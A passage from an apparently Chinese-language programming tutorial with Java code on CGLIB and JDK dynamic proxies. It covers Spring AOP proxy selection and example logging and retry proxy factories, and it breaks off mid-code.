 * 自定义MethodInterceptor
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogMethodInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@param</span> obj       代理对象
     * <span class="hljs-doctag">@param</span> method    目标方法
     * <span class="hljs-doctag">@param</span> args      方法参数
     * <span class="hljs-doctag">@param</span> proxy     方法代理
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                           MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {

        <span class="hljs-comment">// 获取方法信息</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> method.getDeclaringClass().getSimpleName();

        <span class="hljs-comment">// 前置增强</span>
        System.out.println(<span class="hljs-string">"[CGLIB代理] "</span> + className + <span class="hljs-string">"."</span> + methodName + <span class="hljs-string">"() 开始执行"</span>);
        System.out.println(<span class="hljs-string">"[CGLIB代理] 参数: "</span> + Arrays.toString(args));
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        Object result;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 调用父类方法（目标方法）</span>
            result = proxy.invokeSuper(obj, args);

            <span class="hljs-comment">// 后置增强</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            System.out.println(<span class="hljs-string">"[CGLIB代理] 返回值: "</span> + result);
            System.out.println(<span class="hljs-string">"[CGLIB代理] 执行成功，耗时: "</span> + (endTime - startTime) + <span class="hljs-string">"ms"</span>);

        } <span class="hljs-keyword">catch</span> (Throwable e) {
            <span class="hljs-comment">// 异常增强</span>
            System.out.println(<span class="hljs-string">"[CGLIB代理] 执行异常: "</span> + e.getMessage());
            <span class="hljs-keyword">throw</span> e;
        }

        <span class="hljs-keyword">return</span> result;
    }
}

<span class="hljs-comment">/**
 * CGLIB代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CglibProxyFactory</span> {

    <span class="hljs-comment">/**
     * 创建代理对象
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(Class&lt;T&gt; targetClass)</span> {
        <span class="hljs-comment">// 创建Enhancer对象</span>
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();

        <span class="hljs-comment">// 设置父类（目标类）</span>
        enhancer.setSuperclass(targetClass);

        <span class="hljs-comment">// 设置回调（方法拦截器）</span>
        enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LogMethodInterceptor</span>());

        <span class="hljs-comment">// 创建代理对象</span>
        <span class="hljs-keyword">return</span> (T) enhancer.create();
    }

    <span class="hljs-comment">/**
     * 带构造参数创建代理对象
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(Class&lt;T&gt; targetClass,
                                    Class&lt;?&gt;[] argTypes, Object[] args)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(targetClass);
        enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LogMethodInterceptor</span>());

        <span class="hljs-keyword">return</span> (T) enhancer.create(argTypes, args);
    }
}

<span class="hljs-comment">/**
 * 目标类（没有实现接口）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Long userId, BigDecimal amount)</span> {
        System.out.println(<span class="hljs-string">"创建订单: 用户="</span> + userId + <span class="hljs-string">", 金额="</span> + amount);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(System.currentTimeMillis(), userId, amount);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
        System.out.println(<span class="hljs-string">"取消订单: "</span> + orderId);
    }

    <span class="hljs-comment">// final方法不能被代理</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finalMethod</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"这是final方法，不能被代理"</span>);
    }
}

<span class="hljs-comment">/**
 * 使用CGLIB代理
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CglibProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建代理对象（无需目标对象实例）</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> CglibProxyFactory.createProxy(OrderService.class);

        <span class="hljs-comment">// 通过代理调用</span>
        proxy.createOrder(<span class="hljs-number">1L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"99.99"</span>));
        System.out.println(<span class="hljs-string">"---"</span>);
        proxy.cancelOrder(<span class="hljs-number">1001L</span>);
        System.out.println(<span class="hljs-string">"---"</span>);

        <span class="hljs-comment">// final方法不会被代理</span>
        proxy.finalMethod();

        <span class="hljs-comment">// 打印代理类信息</span>
        System.out.println(<span class="hljs-string">"代理类: "</span> + proxy.getClass().getName());
        System.out.println(<span class="hljs-string">"父类: "</span> + proxy.getClass().getSuperclass().getName());
    }
}
</code></pre>
<h4 data-id="heading-14">3.3 CGLIB的高级用法</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 多个回调（CallbackFilter）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiCallbackDemo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(OrderService.class);

        <span class="hljs-comment">// 定义多个回调</span>
        Callback[] callbacks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>[]{
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogMethodInterceptor</span>(),           <span class="hljs-comment">// 索引0：日志拦截器</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceMethodInterceptor</span>(),   <span class="hljs-comment">// 索引1：性能拦截器</span>
            NoOp.INSTANCE                         <span class="hljs-comment">// 索引2：不做任何操作</span>
        };

        enhancer.setCallbacks(callbacks);

        <span class="hljs-comment">// 回调过滤器：决定每个方法使用哪个回调</span>
        enhancer.setCallbackFilter(method -&gt; {
            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();

            <span class="hljs-keyword">if</span> (methodName.startsWith(<span class="hljs-string">"create"</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 使用日志拦截器</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.startsWith(<span class="hljs-string">"find"</span>)) {
                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 使用性能拦截器</span>
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;  <span class="hljs-comment">// 不拦截</span>
            }
        });

        <span class="hljs-type">OrderService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (OrderService) enhancer.create();
        proxy.createOrder(<span class="hljs-number">1L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"100"</span>));
    }
}

<span class="hljs-comment">/**
 * 性能监控拦截器
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceMethodInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                           MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> proxy.invokeSuper(obj, args);

        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
        System.out.println(<span class="hljs-string">"[性能监控] "</span> + method.getName() + <span class="hljs-string">" 耗时: "</span> + duration + <span class="hljs-string">"ms"</span>);

        <span class="hljs-keyword">return</span> result;
    }
}

<span class="hljs-comment">/**
 * 延迟加载（LazyLoader）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyLoadDemo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
        enhancer.setSuperclass(HeavyObject.class);

        <span class="hljs-comment">// 延迟加载回调</span>
        enhancer.setCallback((LazyLoader) () -&gt; {
            System.out.println(<span class="hljs-string">"开始创建HeavyObject..."</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyObject</span>();
        });

        <span class="hljs-type">HeavyObject</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (HeavyObject) enhancer.create();
        System.out.println(<span class="hljs-string">"代理对象已创建，但目标对象尚未创建"</span>);

        <span class="hljs-comment">// 第一次调用方法时才创建目标对象</span>
        proxy.doSomething();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyObject</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HeavyObject</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 模拟耗时初始化</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"HeavyObject.doSomething()"</span>);
    }
}
</code></pre>
<h4 data-id="heading-15">3.4 CGLIB的限制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * CGLIB代理的限制
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CglibLimitation</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ❌ 限制1：不能代理final类</span>
        <span class="hljs-comment">// FinalClass proxy = CglibProxyFactory.createProxy(FinalClass.class);</span>
        <span class="hljs-comment">// 会抛出异常：Cannot subclass final class</span>

        <span class="hljs-comment">// ❌ 限制2：不能代理final方法</span>
        <span class="hljs-comment">// final方法不会被拦截，直接调用原方法</span>

        <span class="hljs-comment">// ❌ 限制3：不能代理private方法</span>
        <span class="hljs-comment">// private方法不能被继承，无法代理</span>
    }
}

<span class="hljs-comment">// final类不能被CGLIB代理</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalClass</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"final类的方法"</span>);
    }
}
</code></pre>
<h3 data-id="heading-16">四、Spring中的代理选择</h3>
<h4 data-id="heading-17">4.1 Spring代理选择策略</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Spring代理选择策略
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAspectJAutoProxy</span>  <span class="hljs-comment">// 默认使用JDK代理</span>
<span class="hljs-comment">// @EnableAspectJAutoProxy(proxyTargetClass = true)  // 强制使用CGLIB</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyConfig</span> {
}
</code></pre>
<pre><code class="hljs language-ini" lang="ini">Spring代理选择流程
┌─────────────────────────────────────────┐
│  目标类是否实现接口？                    │
│         │                                │
│    ┌────┴────┐                          │
│    │         │                          │
│   是         否                          │
│    │         │                          │
│    ▼         ▼                          │
│  JDK代理   CGLIB代理                     │
│  (默认)    (自动)                        │
│                                          │
│  <span class="hljs-attr">proxyTargetClass</span> = <span class="hljs-literal">true</span> ?              │
│    → 强制使用CGLIB代理                   │
└─────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-18">4.2 AopProxyFactory源码分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Spring AOP代理工厂（简化版）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultAopProxyFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AopProxyFactory</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> AopProxy <span class="hljs-title function_">createAopProxy</span><span class="hljs-params">(AdvisedSupport config)</span> {
        <span class="hljs-comment">// 判断使用哪种代理</span>
        <span class="hljs-keyword">if</span> (config.isOptimize() ||                    <span class="hljs-comment">// 优化模式</span>
            config.isProxyTargetClass() ||           <span class="hljs-comment">// 强制CGLIB</span>
            hasNoUserSuppliedProxyInterfaces(config)) { <span class="hljs-comment">// 没有接口</span>

            Class&lt;?&gt; targetClass = config.getTargetClass();

            <span class="hljs-keyword">if</span> (targetClass == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AopConfigException</span>(<span class="hljs-string">"..."</span>);
            }

            <span class="hljs-comment">// 如果是接口或已经是代理类，使用JDK代理</span>
            <span class="hljs-keyword">if</span> (targetClass.isInterface() || Proxy.isProxyClass(targetClass)) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdkDynamicAopProxy</span>(config);
            }

            <span class="hljs-comment">// 否则使用CGLIB代理</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjenesisCglibAopProxy</span>(config);

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 默认使用JDK代理</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdkDynamicAopProxy</span>(config);
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNoUserSuppliedProxyInterfaces</span><span class="hljs-params">(AdvisedSupport config)</span> {
        Class&lt;?&gt;[] interfaces = config.getProxiedInterfaces();
        <span class="hljs-keyword">return</span> interfaces.length == <span class="hljs-number">0</span> ||
               (interfaces.length == <span class="hljs-number">1</span> &amp;&amp; SpringProxy.class.isAssignableFrom(interfaces[<span class="hljs-number">0</span>]));
    }
}
</code></pre>
<h4 data-id="heading-19">4.3 配置代理方式</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * XML配置方式
 */</span>
<span class="hljs-comment">/*
&lt;aop:aspectj-autoproxy proxy-target-class="true"/&gt;
*/</span>

<span class="hljs-comment">/**
 * 注解配置方式
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAspectJAutoProxy(proxyTargetClass = true)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AopConfig</span> {
}

<span class="hljs-comment">/**
 * application.properties配置
 */</span>
<span class="hljs-comment">// spring.aop.proxy-target-class=true</span>

<span class="hljs-comment">/**
 * 事务配置中指定代理方式
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableTransactionManagement(proxyTargetClass = true)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionConfig</span> {
}
</code></pre>
<h3 data-id="heading-20">五、实战案例</h3>
<h4 data-id="heading-21">5.1 案例1：通用日志代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 通用日志代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UniversalLogProxyFactory</span> {

    <span class="hljs-comment">/**
     * 创建代理对象（自动选择代理方式）
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(T target)</span> {
        Class&lt;?&gt; targetClass = target.getClass();

        <span class="hljs-comment">// 判断是否有接口</span>
        <span class="hljs-keyword">if</span> (targetClass.getInterfaces().length &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 使用JDK代理</span>
            <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
                targetClass.getClassLoader(),
                targetClass.getInterfaces(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">UniversalLogHandler</span>(target)
            );
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 使用CGLIB代理</span>
            <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
            enhancer.setSuperclass(targetClass);
            enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UniversalLogInterceptor</span>(target));
            <span class="hljs-keyword">return</span> (T) enhancer.create();
        }
    }
}

<span class="hljs-comment">/**
 * JDK代理处理器
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UniversalLogHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {

    <span class="hljs-keyword">private</span> Object target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UniversalLogHandler</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-keyword">return</span> LogHelper.logAndInvoke(target, method, args, () -&gt; method.invoke(target, args));
    }
}

<span class="hljs-comment">/**
 * CGLIB方法拦截器
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UniversalLogInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

    <span class="hljs-keyword">private</span> Object target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UniversalLogInterceptor</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                           MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-keyword">return</span> LogHelper.logAndInvoke(target, method, args, () -&gt; proxy.invokeSuper(obj, args));
    }
}

<span class="hljs-comment">/**
 * 日志辅助类
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LogHelper</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">logAndInvoke</span><span class="hljs-params">(Object target, Method method, Object[] args,
                                     Callable&lt;Object&gt; invoker)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> target.getClass().getSimpleName();
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();

        System.out.println(<span class="hljs-string">"┌─────────────────────────────────────"</span>);
        System.out.println(<span class="hljs-string">"│ 方法调用: "</span> + className + <span class="hljs-string">"."</span> + methodName);
        System.out.println(<span class="hljs-string">"│ 参数: "</span> + Arrays.toString(args));

        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> invoker.call();

            <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
            System.out.println(<span class="hljs-string">"│ 返回值: "</span> + result);
            System.out.println(<span class="hljs-string">"│ 耗时: "</span> + duration + <span class="hljs-string">"ms"</span>);
            System.out.println(<span class="hljs-string">"└─────────────────────────────────────"</span>);

            <span class="hljs-keyword">return</span> result;

        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.out.println(<span class="hljs-string">"│ 异常: "</span> + e.getMessage());
            System.out.println(<span class="hljs-string">"└─────────────────────────────────────"</span>);
            <span class="hljs-keyword">throw</span> e;
        }
    }
}

<span class="hljs-comment">/**
 * 使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UniversalProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 有接口的类 - 使用JDK代理</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> UniversalLogProxyFactory.createProxy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>());
        userProxy.findById(<span class="hljs-number">1L</span>);

        System.out.println();

        <span class="hljs-comment">// 无接口的类 - 使用CGLIB代理</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderProxy</span> <span class="hljs-operator">=</span> UniversalLogProxyFactory.createProxy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderService</span>());
        orderProxy.createOrder(<span class="hljs-number">1L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"100"</span>));
    }
}
</code></pre>
<h4 data-id="heading-22">5.2 案例2：方法执行重试代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 重试注解
 */</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retryable {
    <span class="hljs-type">int</span> <span class="hljs-title function_">maxAttempts</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">3</span>;           <span class="hljs-comment">// 最大重试次数</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">delay</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">1000</span>;             <span class="hljs-comment">// 重试间隔（毫秒）</span>
    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Throwable</span>&gt;[] value() <span class="hljs-keyword">default</span> {};  <span class="hljs-comment">// 需要重试的异常</span>
}

<span class="hljs-comment">/**
 * 重试代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryProxyFactory</span> {

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(T target)</span> {
        Class&lt;?&gt; targetClass = target.getClass();

        <span class="hljs-keyword">if</span> (targetClass.getInterfaces().length &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
                targetClass.getClassLoader(),
                targetClass.getInterfaces(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetryHandler</span>(target)
            );
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();
            enhancer.setSuperclass(targetClass);
            enhancer.setCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RetryInterceptor</span>(target));
            <span class="hljs-keyword">return</span> (T) enhancer.create();
        }
    }
}

<span class="hljs-comment">/**
 * JDK重试处理器
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {

    <span class="hljs-keyword">private</span> Object target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RetryHandler</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-keyword">return</span> RetryExecutor.executeWithRetry(target, method, args,
            () -&gt; method.invoke(target, args));
    }
}

<span class="hljs-comment">/**
 * CGLIB重试拦截器
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> {

    <span class="hljs-keyword">private</span> Object target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RetryInterceptor</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object obj, Method method, Object[] args,
                           MethodProxy proxy)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-keyword">return</span> RetryExecutor.executeWithRetry(target, method, args,
            () -&gt; proxy.invokeSuper(obj, args));
    }
}

<span class="hljs-comment">/**
 * 重试执行器
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryExecutor</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">executeWithRetry</span><span class="hljs-params">(Object target, Method method, Object[] args,
                                         Callable&lt;Object&gt; invoker)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 获取方法上的@Retryable注解</span>
        <span class="hljs-type">Method</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> target.getClass().getMethod(method.getName(), method.getParameterTypes());
        <span class="hljs-type">Retryable</span> <span class="hljs-variable">retryable</span> <span class="hljs-operator">=</span> targetMethod.getAnnotation(Retryable.class);

        <span class="hljs-keyword">if</span> (retryable == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 没有注解，直接执行</span>
            <span class="hljs-keyword">return</span> invoker.call();
        }

        <span class="hljs-type">int</span> <span class="hljs-variable">maxAttempts</span> <span class="hljs-operator">=</span> retryable.maxAttempts();
        <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> retryable.delay();
        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Throwable</span>&gt;[] retryExceptions = retryable.value();

        <span class="hljs-type">int</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-type">Throwable</span> <span class="hljs-variable">lastException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">while</span> (attempt &lt; maxAttempts) {
            attempt++;
            <span class="hljs-keyword">try</span> {
                System.out.println(<span class="hljs-string">"[重试代理] 第"</span> + attempt + <span class="hljs-string">"次尝试执行: "</span> + method.getName());
                <span class="hljs-keyword">return</span> invoker.call();

            } <span class="hljs-keyword">catch</span> (Throwable e) {
                <span class="hljs-type">Throwable</span> <span class="hljs-variable">cause</span> <span class="hljs-operator">=</span> e <span class="hljs-keyword">instanceof</span> InvocationTargetException
                    ? ((InvocationTargetException) e).getTargetException() : e;

                <span class="hljs-comment">// 检查是否需要重试</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldRetry</span> <span class="hljs-operator">=</span> retryExceptions.length == <span class="hljs-number">0</span> ||
